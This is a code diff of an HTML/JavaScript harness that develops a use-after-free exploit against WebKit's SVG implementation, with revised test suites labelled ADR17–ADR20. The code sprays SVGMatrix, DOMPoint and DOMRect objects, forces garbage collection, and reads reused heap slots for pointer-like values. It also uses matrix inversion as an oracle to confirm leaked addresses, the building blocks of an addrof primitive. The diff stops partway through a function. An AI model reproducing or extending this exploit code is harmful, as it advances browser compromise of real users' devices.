@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v55 — addrof attempts</title>
+<title>SVG UAF v56 — IsoHeap reuse + standalone matrix</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v55 — addrof: fresh alloc uninitialized / CSS leak / SVGAngle oracle</h2>
+<h2>SVG UAF v56 — IsoHeap reuse: standalone matrix / same-bucket / type hunt</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR13')">ADR13: fresh IsoHeap uninit</button>
-  <button onclick="runSuite('ADR14')">ADR14: CSS value leak</button>
-  <button onclick="runSuite('ADR15')">ADR15: SVGAngle oracle</button>
-  <button onclick="runSuite('ADR16')">ADR16: SVGRect/SVGPoint orphan</button>
+  <button onclick="runSuite('ADR17')">ADR17: SVGMatrix same-bucket reuse</button>
+  <button onclick="runSuite('ADR18')">ADR18: 48-byte type hunt</button>
+  <button onclick="runSuite('ADR19')">ADR19: createSVGMatrix standalone lifecycle</button>
+  <button onclick="runSuite('ADR20')">ADR20: SVGMatrix.translate/scale leak</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -56,8 +56,8 @@ function copyAll(){
   }catch(e){fallbackCopy(text,toast);}
 }
 function fallbackCopy(text,toast){
-  var ta=document.createElement('textarea');
-  ta.value=text;ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
+  var ta=document.createElement('textarea');ta.value=text;
+  ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
   document.body.appendChild(ta);ta.select();
   try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
   catch(e){L('Copy failed: '+e.message,'miss');}
@@ -72,8 +72,6 @@ function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:
 function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
 function isPointerLike(f){
   if(!isFinite(f)||isNaN(f)||f<=0)return false;
-  // arm64 userspace heap: typically 0x100000000 (4GB) to 0x1000000000000 (256TB)
-  // More permissive: > 2^28 and < 2^48
   return f>=(1<<28)&&f<Math.pow(2,48);
 }
 function makeSVG(){
@@ -93,496 +91,533 @@ function getOrphanedMatrix(){
   g.parentNode.removeChild(g);removeSVG(svg);
   return m;
 }
-// Confirmed oracle: write a=1/K, d=K, b=c=e=f=0 → inv.a === K
 function inverseOracle(K){
   var m=getOrphanedMatrix();
   m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
-  var inv=m.inverse();
-  return inv.a; // should === K if K is a real heap addr
+  return m.inverse().a;
+}
+// GC pressure helper
+function gcPressure(n){
+  var g=[];
+  for(var i=0;i<(n||100000);i++) g.push({x:i,s:''+i,a:[i]});
+  g=null;
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR13: Fresh IsoHeap allocation — uninitialized field probe
+// ADR19 — standalone createSVGMatrix() lifecycle
 //
-// IsoHeap allocates from bump pointer on a page.
-// When a NEW page is handed out, the memory comes from the OS
-// (mmap) and is zero-filled by the kernel. But when an EXISTING
-// page has free slots from previously freed objects, those slots
-// might have leftover data.
+// svg.createSVGMatrix() returns an SVGMatrix NOT attached to any
+// SVGTransform. In WebKit, this creates a standalone AffineTransform
+// wrapped in an SVGMatrix JS object with RefPtr ownership.
 //
-// Strategy:
-// 1. Spray N SVGMatrices, write distinctive values to all 6 fields
-// 2. Orphan them (JS refs still alive, C++ objects NOT freed because
-//    JS holds Ref<>). They stay alive — this is the JSRef overhang.
-// 3. Force GC to release the JS wrappers
-// 4. Immediately alloc fresh SVGMatrices
-// 5. Read all fields BEFORE writing — any non-identity value means
-//    we got a slot that had previous data
+// Key question: when the JS var goes out of scope, is the C++ object
+// freed? Unlike transform.baseVal.getItem().matrix (which has the
+// SVGTransformList keeping a Ref<>), a standalone createSVGMatrix()
+// result might be FULLY GC-controlled with NO extra Ref<> overhang.
 //
-// The key insight: if we can RELEASE the C++ SVGMatrix objects
-// (not just the JS wrappers), the IsoHeap page gets free slots.
-// The only way to release the C++ side is to drop ALL JS refs.
-// Try with WeakRef + explicit GC trigger.
+// If so: spray 500 standalone SVGMatrices with canary float64,
+// let them go out of scope + GC, then alloc 500 more and check
+// for leftover data. This would be the first REAL IsoHeap reuse.
 // ─────────────────────────────────────────────────────────────────
-function runADR13(){
-  L('','suite-hdr');L('ADR13: IsoHeap uninitialized field probe (fresh alloc after GC)');
+function runADR19(){
+  L('','suite-hdr');L('ADR19: createSVGMatrix() standalone lifecycle probe');
 
-  // Phase 1: build a large pool of SVGMatrices with canary values
-  // Use SVGTransform.matrix (lives in SVGTransform IsoHeap)
-  var CANARY_A=1.1111111111111111e15; // distinctive f64
-  var CANARY_B=2.2222222222222222e15;
-  var CANARY_E=3.3333333333333333e15;
-  var CANARY_F=4.4444444444444444e15;
+  var svg=makeSVG();
 
-  // Build matrices in SVGs, capture WeakRefs, then REMOVE the SVGs
-  // so the ONLY references to the SVGMatrix objects are through
-  // the transform list, which we then remove — leaving C++ objects
-  // potentially GC-reclaimable
-  var matWeakRefs=[];
-  var COUNT=200;
-  for(var k=0;k<COUNT;k++){
+  // Test 1: confirm createSVGMatrix() gives a real writable SVGMatrix
+  var m1=svg.createSVGMatrix();
+  m1.a=1.1;m1.b=2.2;m1.c=3.3;m1.d=4.4;m1.e=5.5;m1.f=6.6;
+  L('ADR19: [T1] createSVGMatrix writable: a='+m1.a+' b='+m1.b+' e='+m1.e);
+  L('ADR19: [T1] a bits='+f64hex(m1.a)+' e bits='+f64hex(m1.e));
+  // Are the fields float64?
+  var f64test=1234567890.123456789;
+  m1.e=f64test;
+  L('ADR19: [T1] f64 test: wrote='+f64test+' read='+m1.e+' isF64='+(m1.e===f64test)+' bits='+f64hex(m1.e));
+
+  // Test 2: does createSVGMatrix have the same IsoHeap bucket as transform.matrix?
+  // Write a known value to both types and check bits are same width
+  var m2=getOrphanedMatrix(); // via transform path
+  var m3=svg.createSVGMatrix(); // standalone path
+  var SECRET=0x1b000deadbeef;
+  m2.e=SECRET; m3.e=SECRET;
+  L('ADR19: [T2] transform.matrix.e='+m2.e+' bits='+f64hex(m2.e));
+  L('ADR19: [T2] createSVGMatrix.e='+m3.e+' bits='+f64hex(m3.e));
+  L('ADR19: [T2] both exact='+(m2.e===SECRET&&m3.e===SECRET));
+
+  // Test 3: lifecycle — use WeakRef to detect GC
+  // Alloc standalone matrices inside a block scope, drop refs, check WeakRef
+  var weakRefs=[];
+  (function allocBlock(){
+    for(var k=0;k<200;k++){
+      var m=svg.createSVGMatrix();
+      m.a=0xdeadbeef;m.e=0x1b0dead0000+k;
+      weakRefs.push(new WeakRef(m));
+      // m goes out of scope here — only WeakRef holds it in JS
+    }
+  })();
+  gcPressure(200000);
+  var alive1=weakRefs.filter(function(w){return w.deref()!==undefined;}).length;
+  L('ADR19: [T3] after 200k GC pressure: standalone alive='+alive1+'/200');
+  // vs transform-path matrices
+  var weakRefs2=[];
+  (function allocBlock2(){
+    for(var k=0;k<200;k++){
+      var m=getOrphanedMatrix();
+      m.a=0xdeadbeef;m.e=0x1b0cafe0000+k;
+      weakRefs2.push(new WeakRef(m));
+    }
+  })();
+  gcPressure(200000);
+  var alive2=weakRefs2.filter(function(w){return w.deref()!==undefined;}).length;
+  L('ADR19: [T3] after 200k GC pressure: transform-orphan alive='+alive2+'/200');
+  L('ADR19: [T3] standalone GC-able='+(alive1<200)+' transform-orphan GC-able='+(alive2<200));
+
+  // Test 4: THE KEY TEST — spray canary, drop refs, GC, spray fresh, read fields
+  // Use standalone path since it MIGHT have better GC behavior
+  var CANARY_A=1.23456789e15;
+  var CANARY_E=9.87654321e14;
+  var SPRAY=300;
+
+  // Phase A: spray with canary, drop ALL refs
+  (function phaseA(){
+    for(var k=0;k<SPRAY;k++){
+      var m=svg.createSVGMatrix();
+      m.a=CANARY_A+k;m.b=0.111;m.c=0.222;m.d=CANARY_A-k;m.e=CANARY_E+k;m.f=CANARY_E-k;
+      // m goes out of scope — NO weak ref kept
+    }
+  })();
+
+  // Aggressive GC
+  gcPressure(500000);
+  // Second pass
+  var gcArr=new Array(100000).fill(0).map(function(_,i){return {v:i};});
+  gcArr=null;
+  gcPressure(200000);
+
+  L('ADR19: [T4] GC done, spraying '+SPRAY+' fresh standalone matrices...');
+  var hits=[];
+  for(var k=0;k<SPRAY;k++){
+    var m=svg.createSVGMatrix();
+    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
+    var dirty=[];
+    if(snap.a!==1) dirty.push('a='+snap.a);
+    if(snap.b!==0) dirty.push('b='+snap.b);
+    if(snap.c!==0) dirty.push('c='+snap.c);
+    if(snap.d!==1) dirty.push('d='+snap.d);
+    if(snap.e!==0) dirty.push('e='+snap.e+' '+f64hex(snap.e));
+    if(snap.f!==0) dirty.push('f='+snap.f+' '+f64hex(snap.f));
+    if(dirty.length>0){
+      hits.push(k);
+      if(hits.length<=8) L('ADR19: ★ fresh['+k+'] non-identity: '+dirty.join(' '),'hit');
+    }
+    for(var field of['a','b','c','d','e','f']){
+      if(isPointerLike(snap[field])){
+        L('ADR19: ★★ fresh['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
+      }
+    }
+  }
+  L('ADR19: [T4] dirty standalone matrices='+hits.length+'/'+SPRAY+(hits.length>0?' ★ ISOHEAP REUSE!':'clean — no reuse'));
+
+  // Test 5: same but with transform-path orphans as the spray
+  (function phaseB(){
+    for(var k=0;k<SPRAY;k++){
+      var m=getOrphanedMatrix();
+      m.a=CANARY_A+k;m.b=0.333;m.c=0.444;m.d=CANARY_A-k;m.e=CANARY_E+k;m.f=CANARY_E-k;
+      // m out of scope
+    }
+  })();
+  gcPressure(500000);
+  var gcArr2=new Array(100000).fill(0).map(function(_,i){return {v:i};});
+  gcArr2=null;
+  gcPressure(200000);
+
+  L('ADR19: [T5] transform-orphan spray done, reading fresh standalone...');
+  var hits2=[];
+  for(var k=0;k<SPRAY;k++){
+    var m=svg.createSVGMatrix();
+    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
+    var dirty=[];
+    if(snap.a!==1) dirty.push('a='+snap.a);
+    if(snap.b!==0) dirty.push('b='+snap.b);
+    if(snap.c!==0) dirty.push('c='+snap.c);
+    if(snap.d!==1) dirty.push('d='+snap.d);
+    if(snap.e!==0) dirty.push('e='+snap.e+' '+f64hex(snap.e));
+    if(snap.f!==0) dirty.push('f='+snap.f+' '+f64hex(snap.f));
+    if(dirty.length>0){
+      hits2.push(k);
+      if(hits2.length<=8) L('ADR19: [T5] ★ fresh['+k+'] non-identity: '+dirty.join(' '),'hit');
+    }
+    for(var field of['a','b','c','d','e','f']){
+      if(isPointerLike(snap[field])){
+        L('ADR19: [T5] ★★ fresh['+k+'].'+field+'='+snap[field]+' PTR-LIKE!','hit');
+      }
+    }
+  }
+  L('ADR19: [T5] dirty='+hits2.length+'/'+SPRAY+(hits2.length>0?' ★ REUSE!':'clean'));
+
+  removeSVG(svg);
+  L('ADR19: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// ADR17 — SVGMatrix same-bucket reuse via transform path
+//
+// More thorough version: use multiple SVGs and explicitly null
+// every reference. Also test with different GC strategies.
+// ─────────────────────────────────────────────────────────────────
+function runADR17(){
+  L('','suite-hdr');L('ADR17: SVGMatrix same-bucket reuse (transform path, thorough)');
+
+  // Strategy: alloc matrices, write canary, then EXPLICITLY null
+  // all variables and do multi-stage GC
+  var CANARY=7.77777777e13;
+  var N=200;
+
+  // Alloc pool — write canary to e and f fields
+  // We need to drop the refs as cleanly as possible
+  var pool=[];
+  for(var k=0;k<N;k++){
     var svg=makeSVG();
     var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
     var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
     var m=g.transform.baseVal.getItem(0).matrix;
-    // Write canaries
-    m.a=CANARY_A;m.b=CANARY_B;m.c=0;m.d=0;m.e=CANARY_E;m.f=CANARY_F;
-    // Remove from DOM — this orphans the matrix (C++ still alive via JS Ref<>)
+    m.a=CANARY+k;m.b=CANARY/2;m.c=CANARY/3;m.d=CANARY-k;m.e=CANARY+k*2;m.f=CANARY+k*3;
+    // Drop from DOM
     g.transform.baseVal.removeItem(0);
     g.parentNode.removeChild(g);
     removeSVG(svg);
-    // WeakRef to the matrix — lets us check if GC collected it
-    matWeakRefs.push(new WeakRef(m));
-    // DO NOT keep strong ref to m
+    // Keep the matrix ref in pool temporarily (to confirm write worked), then null it
+    pool.push(m);
   }
-  L('ADR13: [P1] built '+COUNT+' canary matrices, all strong refs dropped');
+  // Verify canaries written
+  L('ADR17: pool[0].e='+pool[0].e+' expected='+(CANARY+0));
+  L('ADR17: pool[0] bits e='+f64hex(pool[0].e));
+  // Now null ALL refs
+  for(var k=0;k<pool.length;k++) pool[k]=null;
+  pool=null;
 
-  // Phase 2: GC pressure — allocate a lot of garbage to trigger GC
-  var gcPressure=[];
-  for(var i=0;i<50000;i++) gcPressure.push({x:i,y:i*2,z:''+i});
-  gcPressure=null;
+  // Multi-stage GC
+  gcPressure(500000);
+  var tmp=new Array(200000).fill(null).map(function(){return new Object();});tmp=null;
+  gcPressure(300000);
+  var tmp2=new ArrayBuffer(1024*1024*10); tmp2=null; // 10MB alloc to trigger GC
+  gcPressure(200000);
 
-  // Check how many WeakRefs were collected
-  var alive=matWeakRefs.filter(function(w){return w.deref()!==undefined;}).length;
-  L('ADR13: [P2] after GC pressure: alive WeakRefs='+alive+'/'+COUNT);
-  // If alive===COUNT, JSC didn't GC them (strong Ref<> in IsoHeap keeps C++ alive,
-  // and the C++ holds a back-ref to JS wrapper).
-
-  // Phase 3: alloc fresh SVGMatrices — check initial field values
-  L('ADR13: [P3] allocating 200 fresh SVGMatrices, reading fields before write...');
+  L('ADR17: GC done, allocating '+N+' fresh matrices...');
   var hits=[];
-  for(var k=0;k<200;k++){
+  for(var k=0;k<N;k++){
     var svg2=makeSVG();
     var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
     var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
     var m2=g2.transform.baseVal.getItem(0).matrix;
     var snap={a:m2.a,b:m2.b,c:m2.c,d:m2.d,e:m2.e,f:m2.f};
-    // Check for non-identity values we didn't write
-    var dirty=[];
-    if(snap.a!==1){dirty.push('a='+snap.a+' '+f64hex(snap.a));}
-    if(snap.b!==0){dirty.push('b='+snap.b+' '+f64hex(snap.b));}
-    if(snap.c!==0){dirty.push('c='+snap.c+' '+f64hex(snap.c));}
-    if(snap.d!==1){dirty.push('d='+snap.d+' '+f64hex(snap.d));}
-    if(snap.e!==0){dirty.push('e='+snap.e+' '+f64hex(snap.e));}
-    if(snap.f!==0){dirty.push('f='+snap.f+' '+f64hex(snap.f));}
-    if(dirty.length>0){
-      hits.push({k:k,dirty:dirty,snap:snap});
-      if(hits.length<=10) L('ADR13: ★ matrix['+k+'] uninit: '+dirty.join(' '),'hit');
+    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
+      hits.push(k);
+      if(hits.length<=8){
+        L('ADR17: ★ dirty['+k+']: a='+snap.a+' b='+snap.b+' e='+snap.e+' f='+snap.f,'hit');
+        L('ADR17: ★ e bits='+f64hex(snap.e)+' f bits='+f64hex(snap.f),'hit');
+      }
     }
-    // Check if any field is pointer-like
     for(var field of['a','b','c','d','e','f']){
       if(isPointerLike(snap[field])){
-        L('ADR13: ★★ matrix['+k+'].'+field+'='+snap[field]+' PTR-LIKE! '+f64hex(snap[field]),'hit');
-        L('ADR13: ★★ oracle check: inverseOracle('+snap[field]+')='+inverseOracle(snap[field]),'hit');
+        L('ADR17: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
       }
     }
-    // cleanup
     g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
   }
-  L('ADR13: [P3] dirty='+hits.length+'/200'+(hits.length>0?' ★ UNINIT DATA!':'clean — IsoHeap zeroes new pages'));
-
-  // Phase 4: try the same but with DOMMatrix (not IsoHeap — it's a plain JS/fastMalloc object)
-  // DOMMatrix is created via `new DOMMatrix()` — JS heap, NOT IsoHeap
-  // fastMalloc zeroes on alloc, so we expect clean
-  // BUT: if DOMMatrix shares a heap region with something useful...
-  L('ADR13: [P4] DOMMatrix uninit probe...');
-  var domHits=0;
-  for(var k=0;k<100;k++){
-    var dm=new DOMMatrix();
-    // identity is: m11=1 m12=0 m13=0 m14=0  m21=0 m22=1 m23=0 m24=0
-    //              m31=0 m32=0 m33=1 m34=0  m41=0 m42=0 m43=0 m44=1
-    var fields=['m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
-    var identity=[1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1];
-    for(var i=0;i<fields.length;i++){
-      var v=dm[fields[i]];
-      if(v!==identity[i]){
-        domHits++;
-        L('ADR13: [P4] DOMMatrix['+k+'].'+fields[i]+'='+v+' expected='+identity[i],'hit');
-        if(isPointerLike(v)) L('ADR13: [P4] ★★ PTR-LIKE! '+f64hex(v),'hit');
-      }
-    }
-  }
-  L('ADR13: [P4] DOMMatrix dirty fields='+domHits+(domHits>0?' ★':'clean'));
-
-  L('ADR13: done');
+  L('ADR17: dirty='+hits.length+'/'+N+(hits.length>0?' ★ REUSE!':'clean'));
+  L('ADR17: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR14: CSS computed value field leak
+// ADR18 — 48-byte C++ type hunt
 //
-// CSSPrimitiveValue (or its iOS 26 equivalent) is a C++ object.
-// getComputedStyle returns CSSStyleDeclaration backed by C++ objects.
-// The numeric values (fontSize, lineHeight, etc.) are parsed from
-// the style system.
+// SVGMatrix (AffineTransform) is 48 bytes: 6 × float64.
+// What other WebKit SVG/DOM C++ types might share the 48-byte
+// IsoHeap bucket?
 //
-// Approach:
-// 1. Orphan SVGNumbers/SVGAngles with distinctive float values
-// 2. GC pressure
-// 3. getComputedStyle on various elements
-// 4. Parse float values out of CSS strings
-// 5. Check if any value matches our canary OR is pointer-like
+// Candidates:
+// - SVGTransform itself? No — it contains an AffineTransform (48B)
+//   + type uint + angle float = probably 56-64B
+// - SVGPreserveAspectRatio? Small: align uint + meetOrSlice uint ~ 8B
+// - CSSNumericValue? Maybe — CSS Typed OM
+// - DOMPointReadOnly? x,y,z,w float64 = 32B? Or with vtable = 40B?
+// - DOMRect? x,y,w,h float64 = 32B + vtable = 40B?
+// - WebKitCSSMatrix? Full 4x4 = 128B
 //
-// Also: CSSMatrix (WebKitCSSMatrix / DOMMatrix) from CSS transform
-// can be read via getComputedStyle('transform') → new DOMMatrix(str)
-// The matrix entries are real floats parsed from the style system.
+// DOMPoint: {x,y,z,w} all float64. With vtable ptr = 8+32 = 40B?
+// Or with ref count = 8+8+32 = 48B!
+//
+// Test: alloc DOMPoints, write canaries, drop refs, GC,
+// alloc SVGMatrices, check for DOMPoint float64 values in matrix fields.
 // ─────────────────────────────────────────────────────────────────
-function runADR14(){
-  L('','suite-hdr');L('ADR14: CSS computed value / CSSMatrix field leak');
+function runADR18(){
+  L('','suite-hdr');L('ADR18: 48-byte C++ type hunt — DOMPoint/DOMRect cross-type');
 
-  // Phase 1: get initial computed style baseline
-  var el=document.createElement('div');
-  el.style.cssText='position:fixed;top:0;left:0;width:100px;height:100px;font-size:16px;transform:matrix(1,0,0,1,0,0)';
-  document.body.appendChild(el);
-  var cs=window.getComputedStyle(el);
-  L('ADR14: [baseline] fontSize='+cs.fontSize+' lineHeight='+cs.lineHeight);
-  L('ADR14: [baseline] transform='+cs.transform);
+  // Test 1: DOMPoint float64 precision check
+  var pt=new DOMPoint(1.23456789e15, 9.87654321e14, 1.11111111e13, 2.22222222e12);
+  L('ADR18: [T1] DOMPoint.x bits='+f64hex(pt.x)+' isF64='+(pt.x===1.23456789e15));
+  L('ADR18: [T1] DOMPoint.y bits='+f64hex(pt.y)+' isF64='+(pt.y===9.87654321e14));
+  // Confirm DOMPoint uses float64
 
-  // Phase 2: orphan SVGNumbers with canary float values
-  var CANARY=Math.fround(7654321.0);
-  var svg=makeSVG();
-  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','adr14f');
-  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');fe.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  filt.appendChild(fe);svg.appendChild(filt);
-  var bl=fe.values.baseVal;bl.clear();
-  var numRefs=[];
-  for(var i=0;i<500;i++){
-    var n=getTmp().createSVGNumber();n.value=CANARY;
-    bl.appendItem(n);numRefs.push(bl.getItem(bl.length-1));
-  }
-  filt.parentNode.removeChild(filt);removeSVG(svg);
-  L('ADR14: orphaned 500 SVGNumbers with canary='+CANARY);
+  // Test 2: DOMPoint → SVGMatrix cross-type
+  // Alloc N DOMPoints with canary, drop, GC, alloc SVGMatrix
+  var CANARY_X=3.33333333e14;
+  var CANARY_Y=4.44444444e14;
+  var N=300;
+  L('ADR18: [T2] spraying '+N+' DOMPoints then reading SVGMatrices...');
+  (function domSpray(){
+    for(var k=0;k<N;k++){
+      var dp=new DOMPoint(CANARY_X+k, CANARY_Y+k, CANARY_X/2+k, CANARY_Y/2+k);
+      // dp goes out of scope
+    }
+  })();
+  gcPressure(400000);
+  var tmp=new Array(100000).fill(0).map(Object);tmp=null;
+  gcPressure(200000);
 
-  // GC pressure
-  var g=[];for(var i=0;i<100000;i++)g.push(i);g=null;
-
-  // Phase 3: alloc CSSMatrix via transform style and read fields
-  L('ADR14: [P3] probing CSSMatrix from getComputedStyle...');
-  var cssHits=0;
-  for(var k=0;k<50;k++){
-    var div=document.createElement('div');
-    div.style.cssText='position:fixed;top:-9999px;transform:matrix(1,0,0,1,0,0)';
-    document.body.appendChild(div);
-    var transformStr=window.getComputedStyle(div).transform;
-    // parse "matrix(a, b, c, d, e, f)"
-    var match=transformStr.match(/matrix\(([^)]+)\)/);
-    if(match){
-      var parts=match[1].split(',').map(Number);
-      var fieldNames=['a','b','c','d','e','f'];
-      var identity=[1,0,0,1,0,0];
-      for(var i=0;i<parts.length;i++){
-        if(parts[i]!==identity[i]){
-          cssHits++;
-          L('ADR14: [P3] div['+k+'] field['+i+']='+parts[i]+' '+f64hex(parts[i]),'hit');
-          if(isPointerLike(parts[i])) L('ADR14: [P3] ★★ PTR-LIKE!','hit');
-        }
+  var hits18=[];
+  for(var k=0;k<N;k++){
+    var svg=makeSVG();
+    var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
+    var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
+    var m=g.transform.baseVal.getItem(0).matrix;
+    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
+    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
+      hits18.push(k);
+      if(hits18.length<=8){
+        L('ADR18: [T2] ★ matrix['+k+']: e='+snap.e+' '+f64hex(snap.e)+' f='+snap.f+' '+f64hex(snap.f),'hit');
+        L('ADR18: [T2] ★ a='+snap.a+' b='+snap.b+' c='+snap.c+' d='+snap.d,'hit');
       }
     }
-    div.parentNode.removeChild(div);
-  }
-  L('ADR14: [P3] dirty CSSMatrix entries='+cssHits+(cssHits>0?' ★':'clean'));
-
-  // Phase 4: getComputedStyle float properties after orphaned SVGNumbers
-  L('ADR14: [P4] probing numeric CSS properties...');
-  var cssNumHits=0;
-  var numProps=['fontSize','lineHeight','marginTop','marginLeft','paddingTop','borderTopWidth','outlineWidth'];
-  for(var k=0;k<20;k++){
-    var div2=document.createElement('div');
-    div2.style.cssText='position:fixed;top:-9999px;font-size:16px;line-height:1.5;margin:0;padding:0;border:0;outline:0';
-    document.body.appendChild(div2);
-    var cs2=window.getComputedStyle(div2);
-    for(var j=0;j<numProps.length;j++){
-      var raw=cs2[numProps[j]];
-      var val=parseFloat(raw);
-      if(!isNaN(val)&&isPointerLike(val)){
-        cssNumHits++;
-        L('ADR14: [P4] ★★ '+numProps[j]+'='+raw+' parsed='+val+' '+f64hex(val),'hit');
+    for(var field of['a','b','c','d','e','f']){
+      if(isPointerLike(snap[field])){
+        L('ADR18: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
       }
     }
-    div2.parentNode.removeChild(div2);
+    g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
   }
-  L('ADR14: [P4] ptr-like CSS props='+cssNumHits+(cssNumHits>0?' ★★':'clean'));
+  L('ADR18: [T2] DOMPoint→SVGMatrix hits='+hits18.length+'/'+N+(hits18.length>0?' ★ CROSS-TYPE!':'clean'));
 
-  // Phase 5: SVG filter primitive currentColor — does it leak C++ object ptr?
-  L('ADR14: [P5] feFlood flood-color numeric probe...');
-  var svg2=makeSVG();
-  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','adr14b');
-  var flood=document.createElementNS(SVG_NS,'feFlood');
-  flood.setAttribute('flood-color','rgb(1,2,3)');flood.setAttribute('flood-opacity','0.5');
-  filt2.appendChild(flood);svg2.appendChild(filt2);
-  try{
-    // floodColor is a CSSValue — underlying C++ object
-    var fc=window.getComputedStyle(flood)['flood-color']||window.getComputedStyle(flood).floodColor||flood.getAttribute('flood-color');
-    L('ADR14: [P5] flood-color='+fc);
-  }catch(ex){L('ADR14: [P5] '+ex.message,'warn');}
-  removeSVG(svg2);
+  // Test 3: DOMRect → SVGMatrix
+  // DOMRect: x,y,width,height all f64 + vtable + refcount = 48B?
+  L('ADR18: [T3] DOMRect→SVGMatrix cross-type...');
+  var CANARY_R=5.55555555e14;
+  (function rectSpray(){
+    for(var k=0;k<N;k++){
+      var dr=new DOMRect(CANARY_R+k, CANARY_R/2+k, CANARY_R/3+k, CANARY_R/4+k);
+    }
+  })();
+  gcPressure(400000);
+  var tmp2=new Array(100000).fill(0).map(Object);tmp2=null;
+  gcPressure(200000);
 
-  el.parentNode.removeChild(el);
-  L('ADR14: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR15: SVGAngle as oracle + convertToSpecifiedUnits side-channel
-//
-// SVGAngle.value is float32 (m_value field, same as SVGNumber).
-// SVGAngle.convertToSpecifiedUnits(unitType) converts in-place.
-// Unit types: 1=deg, 2=rad, 3=grad
-// Conversion: deg→rad = val * π/180, rad→deg = val * 180/π
-//
-// If we can spray C++ objects adjacent to SVGAngle in IsoHeap,
-// and the SVGAngle.value field inherits bits from the neighbor,
-// reading .value after alloc (before any write) might give us
-// a neighbor's float32 field.
-//
-// Also test: does SVGAngle have any 64-bit fields we missed?
-// .value is CSS-facing (32-bit). What about the internal
-// angle representation before unit conversion?
-//
-// Another angle (pun): SVGAngle.unitType is uint8.
-// A freshly allocated SVGAngle from an IsoHeap slot that held
-// something else might have a non-zero unitType.
-// ─────────────────────────────────────────────────────────────────
-function runADR15(){
-  L('','suite-hdr');L('ADR15: SVGAngle oracle + IsoHeap uninit probe');
-
-  // Phase 1: confirm SVGAngle float64 capacity
-  // SVGAngle.value is float32 (same as SVGNumber)
-  // But: does the matrix.translate path give us float64?
-  // Test: write a value that is exactly representable as f64 but NOT f32
-  var f64only=1.0000000000000002; // 1 + 1 ULP in f64, rounds to 1.0 in f32
-  var svg=makeSVG();
-  var marker=document.createElementNS(SVG_NS,'marker');
-  marker.setAttribute('orient','45deg');svg.appendChild(marker);
-  var angle=marker.orientAngle.baseVal;
-  angle.value=f64only;
-  var readback=angle.value;
-  L('ADR15: [T1] wrote f64only='+f64only+' readback='+readback+' isF32='+(readback===1.0)+' isF64='+(readback===f64only));
-  L('ADR15: [T1] f64only bits='+f64hex(f64only)+' readback bits='+f64hex(readback));
-  // If readback===1.0, SVGAngle.value is float32 (loses the ULP)
-
-  // Phase 2: SVGAngle as float32 oracle
-  // We confirmed SVGMatrix.inverse() is a precise float64 oracle.
-  // Now: can we use SVGAngle differently?
-  // SVGAngle.convertToSpecifiedUnits does C++ arithmetic.
-  // Write 1.0 rad → convert to deg → should be 57.29577951308232 (exact f64)
-  angle.value=1.0; // 1 radian (unitType was deg, so this is 1 degree internally?)
-  // Actually: unitType=2 means rad. value=90 means 90 rad? No —
-  // orientAngle starts as "45deg" so unitType=1 (deg), value=45
-  L('ADR15: [T2] initial: value='+angle.value+' unitType='+angle.unitType);
-  // Convert to rad
-  try{
-    angle.convertToSpecifiedUnits(2); // SVG_ANGLETYPE_RAD=2
-    L('ADR15: [T2] after convertToRad: value='+angle.value+' unitType='+angle.unitType);
-    L('ADR15: [T2] bits='+f64hex(angle.value));
-    // Convert back to deg
-    angle.convertToSpecifiedUnits(1); // SVG_ANGLETYPE_DEG=1
-    L('ADR15: [T2] back to deg: value='+angle.value+' expected='+1.0+' unitType='+angle.unitType);
-  }catch(ex){L('ADR15: [T2] '+ex.message,'warn');}
-
-  marker.parentNode.removeChild(marker);removeSVG(svg);
-
-  // Phase 3: Spray orphaned SVGAngles, read unitType and value before setting
-  // Alloc fresh SVGAngles from IsoHeap, check initial unitType byte
